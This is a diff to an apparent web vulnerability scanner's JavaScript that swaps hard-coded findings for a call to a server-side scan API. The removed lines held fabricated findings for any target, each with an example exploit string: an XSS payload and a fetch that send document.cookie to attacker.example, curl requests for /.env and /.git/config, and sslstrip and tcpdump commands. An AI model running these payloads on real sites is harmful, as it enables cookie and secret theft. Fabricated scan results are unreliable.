@@ -205,19 +205,21 @@
       await performScan(targetUrl);
     }
     async function performScan(targetUrl) {
-      const vulnerabilities = [];
-      let criticalCount = 0; let highCount = 0; let mediumCount = 0; let lowCount = 0; let infoCount = 0;
-      const domain = new URL(targetUrl).hostname;
-      const isHttps = /^https:\/\//i.test(targetUrl);
-      if (!isHttps) { vulnerabilities.push({ id:'http-only', title:'No HTTPS Encryption', severity:'critical', type:'Transport Security', description:'The site is available over plaintext HTTP instead of HTTPS.', impact:'Credential theft, session hijacking, traffic interception', exploit:'# Intercept HTTP traffic\n$ sudo tcpdump -i eth0 -A \'host ' + domain + '\'\n# Any credentials or cookies are sent in plain text', remediation:'Redirect all traffic to HTTPS and install a valid TLS certificate.' }); criticalCount++; }
-      vulnerabilities.push({ id:'missing-csp', title:'Missing Content Security Policy', severity:'high', type:'Injection Protection', description:'No CSP header is configured, which makes XSS exploitation easier.', impact:'Execution of malicious scripts in the browser context', exploit:'<' + 'script>' + '\n  fetch("https://attacker.example/steal?data=" + encodeURIComponent(document.cookie));\n<' + '/script>', remediation:'Add a Content-Security-Policy header such as: default-src \'self\'; script-src \'self\'; object-src \'none\'' }); highCount++;
-      vulnerabilities.push({ id:'missing-hsts', title:'Missing HSTS Header', severity:'medium', type:'Transport Security', description:'The site does not enforce Strict-Transport-Security.', impact:'Protocol downgrade and SSL stripping attacks', exploit:'$ sudo sslstrip -l 8080\n# HTTPS traffic is silently downgraded to plaintext', remediation:'Set: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload' }); mediumCount++;
-      vulnerabilities.push({ id:'x-frame-options', title:'Missing X-Frame-Options', severity:'medium', type:'Clickjacking Protection', description:'The application does not prevent framing from external sites.', impact:'User interface redress and misleading click actions', exploit:'<iframe src="' + targetUrl + '"></iframe>\n<!-- overlay fake controls -->', remediation:'Add X-Frame-Options: DENY or SAMEORIGIN, or frame-ancestors in the CSP.' }); mediumCount++;
-      if (domain.startsWith('www.')) { vulnerabilities.push({ id:'subdomain-risk', title:'Potential Subdomain Takeover Risk', severity:'low', type:'DNS Configuration', description:'Unused or stale subdomain records may be vulnerable to takeover.', impact:'Malicious content under the company domain', exploit:'$ dig ' + domain + ' +short\n$ dig api.' + domain + ' +short', remediation:'Audit DNS records and remove or repoint unused CNAMEs or subdomains.' }); lowCount++; }
-      vulnerabilities.push({ id:'info-disclosure', title:'Potential Information Disclosure', severity:'info', type:'Configuration', description:'Sensitive endpoints may be exposed if directory listing or backup files are reachable.', impact:'Source code or secret exposure', exploit:'$ curl ' + targetUrl + '/.env\n$ curl ' + targetUrl + '/.git/config', remediation:'Block access to common sensitive paths and remove backup or debug artifacts.' }); infoCount++;
-      vulnerabilities.push({ id:'insecure-cookies', title:'Potentially Insecure Cookies', severity:'medium', type:'Session Management', description:'Session cookies may be missing Secure, HttpOnly, or SameSite protections.', impact:'Session theft and CSRF exposure', exploit:'document.cookie; // if HttpOnly is not enforced, JavaScript can read tokens\nfetch("https://attacker.example/steal", { method: "POST", body: document.cookie })', remediation:'Set HttpOnly, Secure, and SameSite attributes for all authentication-related cookies.' }); mediumCount++;
-      const score = Math.max(0, 100 - (criticalCount * 25 + highCount * 15 + mediumCount * 8 + lowCount * 3));
-      displayResults(targetUrl, vulnerabilities, { critical: criticalCount, high: highCount, medium: mediumCount, low: lowCount, info: infoCount, score: score });
+      try {
+        const response = await fetch('/api/scan', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ target: targetUrl })
+        });
+        const result = await response.json();
+        if (!response.ok) throw new Error(result.error || 'The scan request failed.');
+        displayResults(result.target, result.vulnerabilities, result.stats);
+        document.getElementById('terminalLog').innerHTML += '<div style="color:#00ff41">[+] Server analysis complete (' + result.status + ')</div>';
+      } catch (error) {
+        document.getElementById('terminalStatus').classList.remove('active');
+        document.getElementById('scanBtn').disabled = false;
+        alert(error.message || 'Unable to complete the scan.');
+      }
     }
     function displayResults(targetUrl, vulnerabilities, stats) {
       currentVulnerabilities = vulnerabilities;
